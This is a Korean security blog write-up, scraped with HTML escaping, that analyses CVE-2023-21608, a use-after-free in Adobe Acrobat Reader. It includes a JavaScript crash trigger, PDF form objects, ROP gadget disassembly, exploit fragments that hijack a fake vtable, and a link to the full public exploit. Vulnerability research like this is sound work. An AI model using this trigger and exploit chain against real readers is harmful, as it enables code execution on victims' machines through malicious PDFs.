200004ec 8b5074         mov     edx, dword ptr [eax+74h]
200004ef 895304         mov     dword ptr [ebx+4], edx
200004f2 31d2           xor     edx, edx
200004f4 5b             pop     ebx
200004f5 90             nop     
200004f6 90             nop     
200004f7 90             nop     
200004f8 ffe6           jmp     esi&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ROP &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC640; Shellcode&amp;#xC758; &amp;#xC2E4;&amp;#xD589;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;f0&lt;/code&gt;&amp;#xC758; Fake vtable&amp;#xC758; &lt;code&gt;defaultValue&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC; &amp;#xB4F1; &amp;#xC758;&amp;#xB3C4;&amp;#xCE58; &amp;#xC54A;&amp;#xC740; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xBC29;&amp;#xC9C0;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xBCC0;&amp;#xC870;&amp;#xD55C; &lt;code&gt;targetStr&lt;/code&gt;&amp;#xACFC; &lt;code&gt;targetDV&lt;/code&gt;&amp;#xB97C; &amp;#xC6D0;&amp;#xB798;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xBCF5;&amp;#xC6D0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;corruptedTypedArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = originalTargetStrAddr;
&lt;span class=&#34;hljs-comment&#34;&gt;//corruptedTypedArr[FAKE_DV_START+20] = originalDVBackingStore;&lt;/span&gt;
corruptedTypedArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = originalTargetDVAddr;

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; x = f0.defaultValue;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC804;&amp;#xCCB4; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &lt;a href=&#34;https://github.com/hacksysteam/CVE-2023-21608&#34;&gt;Reference&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &lt;code&gt;exploit.pdf&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; JavaScript &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC784;&amp;#xBCA0;&amp;#xB4DC;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xC758; Acrobat&amp;#xC774;&amp;#xB098; Acrobat Reader&amp;#xB85C; &amp;#xC5F4; &amp;#xACBD;&amp;#xC6B0; &amp;#xC704; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; RCE&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB4DC;&amp;#xB514;&amp;#xC5B4;!&amp;#x2026; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC774; &amp;#xB05D;&amp;#xB0AC;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB294; &amp;#xC815;&amp;#xB9D0; &amp;#xC27D;&amp;#xC9C0; &amp;#xC54A;&amp;#xB124;&amp;#xC694;&amp;#x2026; &amp;#xC2DC;&amp;#xC5F0; &amp;#xB370;&amp;#xBAA8;&amp;#xAE4C;&amp;#xC9C0;&amp;#xB9CC; &amp;#xBCF4;&amp;#xC5EC;&amp;#xB4DC;&amp;#xB9AC;&amp;#xACE0; &amp;#xB9C8;&amp;#xCE58;&amp;#xB3C4;&amp;#xB85D;&amp;#xD558;&amp;#xC8E0;!&lt;/p&gt;
&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/f3RObd6h2qw?si=l7WAeyWgGJ_MuCWp&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;h1 id=&#34;Fini&#34;&gt;&lt;a href=&#34;#Fini&#34; class=&#34;headerlink&#34; title=&#34;Fini&#34;&gt;&lt;/a&gt;Fini&lt;/h1&gt;&lt;p&gt;&amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xC640; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xCC98;&amp;#xC74C;&amp;#xC774;&amp;#xC5C8;&amp;#xB294;&amp;#xB370; &amp;#xC815;&amp;#xB9D0; &amp;#xC27D;&amp;#xC9C0; &amp;#xC54A;&amp;#xB124;&amp;#xC694;&amp;#x2026; &amp;#xC774;&amp;#xB7F0; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xB9C8;&amp;#xAD6C; &amp;#xCC3E;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xB4E4;&amp;#xC740; &amp;#xB300;&amp;#xCCB4; &amp;#xBB50;&amp;#xD558;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xB4E4;&amp;#xC77C;&amp;#xAE4C; &amp;#xC2F6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xCC38;&amp;#xACE0;&amp;#xD560;&amp;#xB9CC;&amp;#xD55C; &amp;#xC88B;&amp;#xC740; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4;&amp;#xAC00; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xC27D;&amp;#xAC8C;?&amp;#x2026; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xB294;&amp;#xB370; &amp;#xD328;&amp;#xCE58; &amp;#xBD84;&amp;#xC11D; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC740; &amp;#xC5C6;&amp;#xC5B4;&amp;#xC11C; &amp;#xC9C1;&amp;#xC811; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xC7AC;&amp;#xBC0C;&amp;#xAE30;&amp;#xB3C4; &amp;#xD588;&amp;#xACE0;&amp;#xC694; &amp;#xC2DC;&amp;#xAC04;&amp;#xB9CC; &amp;#xC788;&amp;#xB2E4;&amp;#xBA74; &amp;#xC55E;&amp;#xC73C;&amp;#xB85C;&amp;#xB3C4; &amp;#xC774;&amp;#xB7F0; &amp;#xAE00; &amp;#xB9CE;&amp;#xC774; &amp;#xC368;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608&#34;&gt;https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hacksysteam/CVE-2023-21608&#34;&gt;https://github.com/hacksysteam/CVE-2023-21608&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] 1day1document : CVE-2023-21608 - hackyboiz">
  <meta property="og:description" content="&lt;h1 id=&#34;Init&#34;&gt;&lt;a href=&#34;#Init&#34; class=&#34;headerlink&#34; title=&#34;Init&#34;&gt;&lt;/a&gt;Init&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! pwndorei&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC624;&amp;#xB298;&amp;#xC740; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xC5F0;&amp;#xAD6C;&amp;#xAE00;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC654;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xBC88; &amp;#xAE00;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC81C;&amp;#xBAA9;&amp;#xCC98;&amp;#xB7FC; CVE-2023-21608&amp;#xC758; &amp;#xBD84;&amp;#xC11D; &amp;#xBC0F; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xB2E4;&amp;#xB8F0; &amp;#xAC83;&amp;#xC774;&amp;#xACE0; &amp;#xD558;&amp;#xB8E8;&amp;#xD55C;&amp;#xC904;&amp;#xC5D0; &amp;#xC880; &amp;#xBD80;&amp;#xC871;&amp;#xD568;&amp;#xC744; &amp;#xB290;&amp;#xB07C;&amp;#xC168;&amp;#xC744; &amp;#xBD84;&amp;#xB4E4;&amp;#xC744; &amp;#xC704;&amp;#xD55C; &amp;#xD558;&amp;#xB8E8; &amp;#xD55C; &amp;#xBB38;&amp;#xC11C;&amp;#xCBE4; &amp;#xB418;&amp;#xB294; &amp;#xBD84;&amp;#xB7C9;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/8yf1gt.gif&#34; alt=&#34;8yf1gt.gif&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;-&amp;#xC815;&amp;#xBCF4;&#34;&gt;&lt;a href=&#34;#1-&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;-&amp;#xC815;&amp;#xBCF4;&#34; class=&#34;headerlink&#34; title=&#34;1. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC815;&amp;#xBCF4;&#34;&gt;&lt;/a&gt;1. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC815;&amp;#xBCF4;&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&#34;Description&#34;&gt;&lt;a href=&#34;#Description&#34; class=&#34;headerlink&#34; title=&#34;Description&#34;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;CVE-2023-21608&amp;#xC740; Adobe &amp;#xC0AC;&amp;#xC758; PDF &amp;#xBB38;&amp;#xC11C; &amp;#xD3B8;&amp;#xC9D1;, &amp;#xBCC0;&amp;#xD658; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC778; Acrobat&amp;#xACFC; PDF &amp;#xBDF0;&amp;#xC5B4;&amp;#xC778; Acrobat Reader &amp;#xC81C;&amp;#xD488;&amp;#xAD70;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD55C; Use-After-Free &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xB4E4;&amp;#xC5D0;&amp;#xC11C; &amp;#xC545;&amp;#xC131; PDF &amp;#xBB38;&amp;#xC11C;&amp;#xB97C; &amp;#xC5F4;&amp;#xBA74; &amp;#xBB38;&amp;#xC11C;&amp;#xC5D0; &amp;#xD3EC;&amp;#xD568;&amp;#xB41C; Javascript &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB418;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xD558;&amp;#xC5EC; Remote Code Execution&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Affected-Product-amp-Version-Information&#34;&gt;&lt;a href=&#34;#Affected-Product-amp-Version-Information&#34; class=&#34;headerlink&#34; title=&#34;Affected Product &amp;amp; Version Information&#34;&gt;&lt;/a&gt;Affected Product &amp;amp; Version Information&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Adobe Acrobat 2020&lt;ul&gt;
&lt;li&gt;version &amp;#x2264; 20.005.30418&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adobe Acrobat Reader 2020&lt;ul&gt;
&lt;li&gt;version &amp;#x2264; 20.005.30418&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Acrobat DC&lt;ul&gt;
&lt;li&gt;version &amp;#x2264; 22.003.20282&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Acrobat Reader DC&lt;ul&gt;
&lt;li&gt;version &amp;#x2264;  22.003.20282&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC81C; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &amp;#xBD84;&amp;#xC11D;&amp;#xACFC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC704;&amp;#xD574; Adobe Acrobat Reader DC x86&amp;#xC758; 2022.001.20085 &amp;#xBC84;&amp;#xC804;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;2-&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;-&amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;a href=&#34;#2-&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;-&amp;#xBD84;&amp;#xC11D;&#34; class=&#34;headerlink&#34; title=&#34;2. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;/a&gt;2. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xBD84;&amp;#xC11D;&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC544;&amp;#xB798;&amp;#xB294; Use-After-Free&amp;#xB97C; &amp;#xC720;&amp;#xBC1C;&amp;#xD558;&amp;#xC5EC; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294;&amp;#xB370; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; Javascript &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; testField = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.getField(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;testField&amp;quot;&lt;/span&gt;);

testField.richText = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;

testField.setAction(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Calculate&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;calculateCallback()&amp;quot;&lt;/span&gt;);

&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; { &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.resetForm(); } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (e) {}

&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; { &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.resetForm(); } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (e) {}  &lt;span class=&#34;hljs-comment&#34;&gt;// bug is triggered during this resetForm call&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;calculateCallback&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{

  event.__defineGetter__(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;target&amp;quot;&lt;/span&gt;, getterFunc);

  event.richValue = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;;

}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;getterFunc&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{

  &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; { &lt;span class=&#34;hljs-built_in&#34;&gt;Object&lt;/span&gt;.defineProperty(testField, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;textFont&amp;quot;&lt;/span&gt;, { &lt;span class=&#34;hljs-attr&#34;&gt;value&lt;/span&gt;: &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt; }); } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt;(e) { }

}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC0BD;&amp;#xC785;&amp;#xB41C; PDF &amp;#xBB38;&amp;#xC11C;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &lt;code&gt;testField&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xB294; text field&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;5 0 obj
&amp;lt;&amp;lt;
&lt;span class=&#34;hljs-built_in&#34;&gt;/Type &lt;/span&gt;/Annot
/Subtype /Widget
/T (testField)
/FT /Tx
/Rect [0 0 0 0]
&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC0BD;&amp;#xC785;&amp;#xB41C; &amp;#xBB38;&amp;#xC11C;&amp;#xB97C; &amp;#xC5F4;&amp;#xAC8C; &amp;#xB418;&amp;#xBA74; &amp;#xC704;&amp;#xC758; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; (1)&amp;#xBB38;&amp;#xC11C; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8; &lt;code&gt;doc&lt;/code&gt;&amp;#xC758; Instance&amp;#xC778; &lt;code&gt;this&lt;/code&gt;&amp;#xC758; &lt;code&gt;getField&lt;/code&gt; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;testField&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC624;&amp;#xACE0; (2)&lt;code&gt;setAction&lt;/code&gt; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;testField&lt;/code&gt;&amp;#xC758;  &lt;code&gt;Calculate&lt;/code&gt; &amp;#xD578;&amp;#xB4E4;&amp;#xB7EC;&amp;#xB85C; &lt;code&gt;calculateCallback&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC9C0;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC14;&amp;#xB85C; &amp;#xB2E4;&amp;#xC74C; &amp;#xC904;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294; (3)&lt;code&gt;this.resetForm()&lt;/code&gt;&amp;#xC740; &lt;code&gt;Calculate&lt;/code&gt; &amp;#xD578;&amp;#xB4E4;&amp;#xB7EC;&amp;#xAC00; &amp;#xC815;&amp;#xC758;&amp;#xB41C; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD544;&amp;#xB4DC; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC5D0; &lt;code&gt;calculate&lt;/code&gt; &amp;#xC774;&amp;#xBCA4;&amp;#xD2B8;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xCF1C; &amp;#xD578;&amp;#xB4E4;&amp;#xB7EC;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB3C4;&amp;#xB85D; &amp;#xB9CC;&amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;testField&lt;/code&gt;&amp;#xC758; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; (4)&lt;code&gt;calculateCallback&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xACE0; &amp;#xC774; &amp;#xD568;&amp;#xC218; &amp;#xC548;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;event&lt;/code&gt;&amp;#xC758; &lt;code&gt;target&lt;/code&gt; &amp;#xC18D;&amp;#xC131;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; getter&amp;#xB97C; &lt;code&gt;getterFunc&lt;/code&gt;&amp;#xB85C; &amp;#xC7AC;&amp;#xC815;&amp;#xC758;&amp;#xD558;&amp;#xACE0; &lt;code&gt;richiValue&lt;/code&gt; &amp;#xC18D;&amp;#xC131;&amp;#xC5D0; &lt;code&gt;this&lt;/code&gt;&amp;#xB97C; &amp;#xB300;&amp;#xC785;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &lt;code&gt;richValue&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xC785;&amp;#xB420; &amp;#xAC12;&amp;#xC778; &lt;code&gt;this&lt;/code&gt; (&lt;code&gt;doc&lt;/code&gt;)&amp;#xC758; &amp;#xBAA8;&amp;#xB4E0; &amp;#xC18D;&amp;#xC131;&amp;#xACFC; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xAC00; &lt;code&gt;EScript!ESObjectEnum&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xC7AC;&amp;#xADC0;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC5F4;&amp;#xAC70;&amp;#xB418;&amp;#xAE30; &amp;#xC2DC;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;event.target&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5B4; &lt;code&gt;getterFunc&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xACE0; &lt;code&gt;testField.textFont&lt;/code&gt;&amp;#xAC00; &lt;code&gt;this&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xB00C;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &lt;code&gt;this.resetForm()&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xBC18;&amp;#xBCF5;&amp;#xB418;&amp;#xC9C0;&amp;#xB9CC; &lt;code&gt;this&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xB010; &lt;code&gt;testField.textFont&lt;/code&gt;&amp;#xAC00; &amp;#xC218;&amp;#xC815; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;(non-configurable)&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;getterFunc&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC608;&amp;#xC678;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xBC1C;&amp;#xC0DD;&amp;#xD55C; &amp;#xC608;&amp;#xC678;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &lt;code&gt;event.richValue&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xB54C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;AcroForm!GetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xBD84;&amp;#xAE30;&amp;#xB85C; &amp;#xC9C4;&amp;#xC785;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &amp;#xC5F4;&amp;#xAC70; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &lt;code&gt;CAgg&lt;/code&gt;&amp;#xC640; &lt;code&gt;map&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; 